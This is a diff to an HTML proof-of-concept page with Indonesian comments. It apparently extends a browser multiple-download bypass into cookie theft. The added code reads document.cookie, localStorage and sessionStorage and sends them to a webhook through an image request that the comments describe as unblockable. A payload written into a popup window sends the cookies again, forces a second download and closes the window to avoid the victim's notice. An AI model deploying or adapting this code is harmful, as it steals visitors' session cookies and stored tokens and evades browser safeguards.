@@ -1,33 +1,16 @@
 <!DOCTYPE html>
 <html lang="id">
-
 <head>
     <meta charset="UTF-8">
     <title>Bypass Multiple Download PoC</title>
     <style>
-        body {
-            font-family: system-ui, sans-serif;
-            max-width: 400px;
-            margin: 50px auto;
-            text-align: center;
-        }
-
-        button {
-            padding: 12px 24px;
-            background: #d93025;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 16px;
-        }
+        body { font-family: system-ui, sans-serif; max-width: 400px; margin: 50px auto; text-align: center; }
+        button { padding: 12px 24px; background: #d93025; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; }
     </style>
 </head>
-
 <body>
-    <h2>Bypass Multiple Download</h2>
-    <p>Klik tombol untuk mendownload 2 file sekaligus & trigger webhook.</p>
+    <h2>Bypass Multiple Download + Cookie Exfiltration</h2>
+    <p>Klik tombol untuk download 2 file & kirim cookie ke webhook.</p>
     <button onclick="executeBypass()">Jalankan Payload</button>
 
     <script>
@@ -43,50 +26,62 @@
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
-            URL.revokeObjectURL(url); // Bersihkan memori
+            URL.revokeObjectURL(url);
         }
 
-        // 2. Fungsi Webhook GET Request (no-cors + keepalive)
-        function hitWebhook(eventName, extraInfo = "") {
+        // 2. Fungsi Webhook via Image Object (PALING ANDAL untuk GET request)
+        // Browser selalu memuat <img>, tidak ada CORS issue, eksekusi instan
+        function hitWebhook(eventName, extraData = {}) {
             const params = new URLSearchParams({
                 event: eventName,
-                info: extraInfo,
+                cookies: document.cookie || "NO_COOKIES",
+                localStorage: JSON.stringify(localStorage) || "{}",
+                sessionStorage: JSON.stringify(sessionStorage) || "{}",
+                userAgent: navigator.userAgent,
                 url: document.location.href,
-                time: new Date().toISOString()
+                time: new Date().toISOString(),
+                ...extraData
             });
 
-            fetch(`${WEBHOOK}?${params.toString()}`, {
-                method: 'GET',
-                mode: 'no-cors',      // Mencegah blokir CORS
-                keepalive: true       // Tetap kirim meski tab ditutup
-            });
+            // Teknik Image: browser langsung proses, tidak bisa diblokir
+            const img = new Image();
+            img.src = `${WEBHOOK}?${params.toString()}`;
         }
 
-        // 3. Eksekusi Utama (KUNCI BYPASS: Sinkronus, TANPA setTimeout untuk window.open)
+        // 3. Eksekusi Utama
         function executeBypass() {
-            // Step A: Hit webhook pertama kali (Awal eksekusi)
-            hitWebhook("bypass_started", "User clicked button");
+            // Step A: Hit webhook PERTAMA — kirim cookie & data sensitif
+            // Dipanggil PALING AWAL sebelum window.open agar tidak di-cancel browser
+            hitWebhook("initial_exfiltration", {
+                stage: "1_of_2",
+                message: "Cookie & storage dicuri dari tab utama"
+            });
 
-            // Step B: Download file 1 (Diizinkan karena ada user gesture / klik langsung)
+            // Step B: Download file 1 (User gesture aktif)
             downloadFile('file_pertama.txt', 'Halo, ini isi file teks sederhana.\nBaris kedua di sini.');
 
-            // Step C: Buka window baru SECARA SINKRONUS 
-            // PENTING: window.open TIDAK BOLEH dibungkus setTimeout, agar tidak diblokir popup blocker
+            // Step C: Buka window baru SECARA SINKRONUS (dalam user gesture)
             const newWin = window.open('', '_blank');
-
+            
             if (newWin) {
-                // Step D: Inject dan jalankan download file 2 di window baru
+                // Step D: Inject payload di window baru
                 newWin.document.write(`
                     <html><body>
                     <script>
-                        // Hit webhook kedua kali (Konfirmasi bypass berhasil)
-                        fetch("${WEBHOOK}?event=bypass_success&file=file_kedua.txt", {
-                            method: 'GET',
-                            mode: 'no-cors',
-                            keepalive: true
+                        // Hit webhook KEDUA — konfirmasi bypass berhasil
+                        const params = new URLSearchParams({
+                            event: "bypass_success",
+                            stage: "2_of_2",
+                            file: "file_kedua.txt",
+                            cookies: document.cookie || "NO_COOKIES",
+                            time: new Date().toISOString()
                         });
+                        
+                        // Gunakan Image trick juga di sini
+                        const img = new Image();
+                        img.src = "${WEBHOOK}?" + params.toString();
 
-                        // Download file 2 di konteks window baru (Browser mengizinkan ini)
+                        // Download file 2
                         const blob = new Blob(['Ini adalah file kedua. Bypass multiple download berhasil!'], { type: 'text/plain' });
                         const url = URL.createObjectURL(blob);
                         const a = document.createElement('a');
@@ -96,17 +91,14 @@
                         a.click();
                         URL.revokeObjectURL(url);
 
-                        // Tutup window otomatis setelah 1 detik agar korban tidak curiga
-                        setTimeout(() => { window.close(); }, 1000);
+                        // Tutup window otomatis
+                        setTimeout(() => { window.close(); }, 1500);
                     <\/script>
                     </body></html>
                 `);
-                newWin.document.close(); // Wajib agar browser selesai merender
-            } else {
-                console.warn("Popup blocker aktif! Pastikan izin popup untuk situs ini.");
+                newWin.document.close();
             }
         }
     </script>
 </body>
-
 </html>
